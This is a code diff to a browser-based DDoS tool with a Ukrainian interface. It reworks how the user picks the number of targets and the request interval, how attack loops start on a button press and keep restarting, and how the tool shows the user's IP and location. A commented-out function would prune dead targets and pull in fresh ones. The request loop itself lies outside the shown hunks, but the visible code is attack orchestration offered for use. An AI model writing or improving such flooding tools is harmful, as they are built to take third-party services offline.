@@ -52,36 +52,48 @@ getTargets = function (a) {
 getTargets(getLocatioInfo);
 function getLocatioInfo() {
 	let locationContainer = document.getElementById("conectionInfo");
-	setInterval(() => {
-		fetch(ipApi)
-			.then((responce) => {
-				return responce.json();
-			})
-			.then((data) => {
-				locationContainer.innerHTML = `<p class="main-desc"> Ваша країна ${data.country}</p>
+	setInterval(getLocatioInfo, 60000);
+	fetch(ipApi)
+		.then((responce) => {
+			return responce.json();
+		})
+		.then((data) => {
+			locationContainer.innerHTML = `<p class="main-desc"> Ваша країна ${data.country}</p>
 			<p class="main-desc">Ваше місто ${data.city}</p>
 			<p class="main-desc">Ваш провайдер ${data.org}</p>
 			<p class="main-desc"> Ваша IP адреса ${data.query}</p>`;
-			})
-			.catch((err) => {
-				console.log(err);
-				alert("Неможливо отримати інформацію про ваше підключення");
-			});
-	}, 125000);
+		})
+		.catch((err) => {
+			console.log(err);
+			alert("Неможливо отримати інформацію про ваше підключення");
+		});
 }
+
 counterRange.addEventListener("input", (e) => {
 	count = e.target.value;
-	counterText.textContent = count;
+	selectTargets(count);
+});
+function selectTargets(a = count) {
+	counterText.textContent = a;
 	attacketTargets = [];
-	for (let i = 0; i < count; i++) {
+	for (let i = 0; i < a; i++) {
 		attacketTargets.push(targets[i]);
 	}
-});
+	if (startBtn.classList.contains("clicked")) {
+		makeDdos();
+	}
+}
 intervalRange.addEventListener("input", (e) => {
 	interval = e.target.value;
 	intervalText.textContent = interval;
+	selectTargets(count);
+	makeDdos();
 });
-startBtn.addEventListener("click", makeDdos);
+startBtn.addEventListener("click", (e) => {
+	selectTargets(count);
+	makeDdos();
+	e.target.classList.add("clicked");
+});
 function makeDdos() {
 	setInterval(() => {
 		attacketTargets.forEach((k, i) => {
@@ -154,8 +166,25 @@ function drawStatistic() {
 		errCir.style.strokeDashoffset = -circulance + (errPercent * circulance) / 100;
 		errCir.style.strokeDasharray = (errPercent * circulance) / 100 + ` ${circulance - (errPercent * circulance) / 100}`;
 		errCir.style.stroke = "rgb(254, 113, 113)";
+		// sanitaizeTarget();
 	}, 1000);
 }
+// function sanitaizeTarget() {
+// 	let liveTargets = [];
+// 	attacketTargets.forEach((k, i) => {
+// 		if (k.err < 10) {
+// 			liveTargets.push(k);
+// 		}
+// 	});
+// 	attacketTargets = liveTargets;
+// 	if (attacketTargets.length < count) {
+// 		for (let i = count; i < attacketTargets.length; i++) {
+// 			attacketTargets.push(targets[i]);
+// 			console.log(targets[i]);
+// 		}
+// 		makeDdos();
+// 	}
+// }
 lightModeBtn.addEventListener("click", () => {
 	document.body.classList.toggle("dark");
 });
